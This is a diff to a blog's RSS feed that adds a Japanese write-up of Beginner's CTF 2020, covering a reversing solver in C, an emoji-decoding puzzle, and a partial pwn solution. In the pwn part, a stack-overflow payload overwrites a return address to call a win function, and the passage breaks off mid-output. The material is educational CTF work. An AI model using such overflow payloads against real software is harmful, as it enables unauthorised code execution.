@@ -7,7 +7,287 @@
         <generator>Zola</generator>
         <language>en</language>
         <atom:link href="https://earlgray283.github.io/public/categories/blog/rss.xml" rel="self" type="application/rss+xml"/>
-        <lastBuildDate>Mon, 18 May 2020 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Sun, 24 May 2020 00:00:00 +0000</lastBuildDate>
+        
+            <item>
+                <title>Beginner&#x27;s CTF 2020 Writeup</title>
+                <pubDate>Sun, 24 May 2020 00:00:00 +0000</pubDate>
+                <link>https://earlgray283.github.io/public/ctf4b/</link>
+                <guid>https://earlgray283.github.io/public/ctf4b/</guid>
+                <description>&lt;h2 id=&quot;beginner-s-ctf-2020-nican-jia-sitekimasita&quot;&gt;Beginner&#x27;s CTF 2020 に参加してきました。&lt;&#x2F;h2&gt;
+&lt;p&gt;　Beginner&#x27;s CTF に rm -rf &#x2F;kadai として参加しました。メンバー全員が CTF 初参戦でしたが、217点を獲得し361位となることができたのでまあよかったんじゃないかなと思います。個人的には pwn が解けなかったのが一番悔しいです。Conglaturation! じゃあないんだよな。&lt;br &#x2F;&gt;
+　私は Reversing の mask, Misc の emoemoencode, Pwn の Beginner&#x27;s Stack に挑戦したのでそれらについて書いていこうかなと思います。&lt;&#x2F;p&gt;
+&lt;br&gt;
+&lt;h2 id=&quot;mask-reversing-62pt&quot;&gt;mask(Reversing, 62pt)&lt;&#x2F;h2&gt;
+&lt;p&gt;　一番最初に解いた問題です。&lt;br &#x2F;&gt;
+まずは mask のバイナリファイルを落としてファイルの確認をすると ELF ファイルだったのでまあ実行するんだろうなと思って実行したらなにか出てきました(ここまで早口)&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#bf616a;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; .&#x2F;mask
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Usage:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; .&#x2F;mask &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;FLAG&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;　ということで適当なフラグを入れて見たけど、わからん！ｗ&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#bf616a;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; .&#x2F;mask ctf4b{329}
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Putting&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; on masks...
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;atd4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;q101u
+c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;`b bk#&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;)i
+Wrong FLAG. Try again.
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;　バイナリファイルが与えられたら &lt;code&gt;strings&lt;&#x2F;code&gt; で中身見ろっておじいちゃんが言っていたのを思い出し、確認をしてみました。すると、&lt;code&gt;Putting on masks...&lt;&#x2F;code&gt;の付近になにやら見慣れた文字列が・・・&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#bf616a;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; strings mask
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;.
+.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Putting&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; on masks...
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;atd4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;qdedtUpetepqeUdaaeUeaqau
+c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;`b bk`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;kj&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;`KbababcaKbacaKiacki
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Correct!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Submit your FLAG.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;.
+.
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;　ふむふむ、つまり変換後の文字列が&lt;code&gt;atd4`qdedtUpetepqeUdaaeUeaqau&lt;&#x2F;code&gt;-&amp;gt;&lt;code&gt;c`b bk`kj`KbababcaKbacaKiacki&lt;&#x2F;code&gt;というように変換されるように入力を与えてあげればいいということですね。&lt;br &#x2F;&gt;
+　ということで、a-z A-Z それぞれがどのように変換されるかを調べ、条件を満たすように全パターン列挙するコードを書きました！競プロで培ってきた†全探索†です。(変数名クッソ雑ですみません・・・)&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#b48ead;&quot;&gt;#include&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;stdio.h&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;string.h&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;() {
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;*alphabet = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;*list1 = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;a`adede`a`adedepqpqtutupqpA@ADEDE@A@ADEDEPQPQTUTUPQP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;*list2 = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abc`abchijkhijk`abc`abchijABC@ABCHIJKHIJK@ABC@ABCHIJ&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;*ans1 = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;atd4`qdedtUpetepqeUdaaeUeaqau&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;*ans2 = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;c`b bk`kj`KbababcaKbacaKiacki&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; ans[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;];
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; i=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;;i&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(ans1);i++)ans[i]=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;;
+    ans[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(ans1)]=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; i=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;;i&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(ans1);i++){
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; j=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;;j&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(list1);j++) {
+            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(ans1[i]==list1[j]&amp;amp;&amp;amp;ans2[i]==list2[j]){
+                ans[i]=alphabet[j];
+                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;, ans);
+                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;;
+            }
+        }
+    }
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;これの出力結果を mask の引数に渡すと合ってるよ！って言ってくれました。&lt;&#x2F;p&gt;
+&lt;br&gt;
+&lt;h2 id=&quot;emoemoencode-misc-53pt&quot;&gt;emoemoencode(Misc, 53pt)&lt;&#x2F;h2&gt;
+&lt;p&gt;　google 先生に聞いても知らないの一点張りだったので自分でなんとかしました。&lt;br &#x2F;&gt;
+文字は数字！と毎日唱えていればそこまで難しくはありません。最終的にどうせ&lt;code&gt;ctf4b{...}&lt;&#x2F;code&gt;って形になるんだろうな～って思いながら🍣を &#x27;c&#x27; と考え、あとは文字の足し算引き算を頑張って、すべての絵文字を半角英字に置き換えました。そしたらフラグが出てきたのでニッコリしました。&lt;&#x2F;p&gt;
+&lt;br&gt;
+&lt;h2 id=&quot;beginner-s-stack-pwn-134pt&quot;&gt;Beginner&#x27;s Stack(Pwn, 134pt)&lt;&#x2F;h2&gt;
+&lt;p&gt;　この問題をコンテスト中に解くことはできませんでしたが、かなり惜しいところまでいけていたので書くことにします。&lt;br &#x2F;&gt;
+まずはバイナリを落としてから例の作業をして実行ファイルとわかったので実行します。&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#bf616a;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; .&#x2F;chall
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Your&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; goal is to call `&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;win&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;` function (located at 0x400861)
+
+   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]           [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Stack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fff121f1da0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f91447cbfc8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; buf
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fff121f1da8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000400ad0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fff121f1db0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000400ad0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fff121f1db8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f9144806190 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fff121f1dc0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007fff121f1dd0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; saved rbp (vuln)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fff121f1dc8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x000000000040084e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; return address (vuln)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fff121f1dd0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000000000 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; saved rbp (main)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fff121f1dd8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f91446020b3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; return address (main)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fff121f1de0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f9144804620 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007fff121f1de8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007fff121f1ec8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+
+Input:
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;　正直この瞬間にもうすべてが嫌になったのですが、せっかくの ctf だし頑張るぞ精神で死ぬほど頑張りました。えらい。&lt;br &#x2F;&gt;
+　私はまだ pwn を一回もやったことがなかったので、そもそも何をすればいいのかがわかりませんでした。とりあえず&lt;code&gt;objdump -d chall&lt;&#x2F;code&gt;でアセンブラを見てみます。長くなるので書きませんが、win 関数が呼ばれていないことがわかったので、どうにかして呼び出すんだろうなというところまではわかりました。&lt;br &#x2F;&gt;
+　じゃあどうすんのって話なんですが、色々調べていたら &lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;matsubara0507&#x2F;72dc50c89200a09f7c61&quot;&gt;素晴らしい記事&lt;&#x2F;a&gt; を見つけました。この記事の内容と今回の問題でしたいことがほぼ一致していたので、スタックオーバーフローさせてリターンアドレスをいじればいいんだなということがわかりました。具体的には、vuln 関数のリターンアドレスを win 関数のアドレスに書き換えてあげれば良いです。早速スタックオーバーフローとアドレス書き換えを試してみました。&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#bf616a;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; echo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x61\x08\x40\x00\x00\x00\x00\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39; | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;.&#x2F;chall
+Your&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; goal is to call `&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;win&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;` function (located at 0x400861)
+
+   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]           [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Stack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a3e0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f76886e3fc8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; buf
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a3e8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000400ad0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a3f0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000400ad0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a3f8 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f768871e190 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a400 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007ffc3170a410 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; saved rbp (vuln)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a408 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x000000000040084e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; return address (vuln)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a410 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x0000000000000000 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; saved rbp (main)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a418 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f768851a0b3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &amp;lt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; return address (main)
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a420 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007f768871c620 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+0x00007ffc3170a428 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007ffc3170a508 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;|
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
+
+Input:
+   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]           [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Stack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;]
+                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;+--------------------+
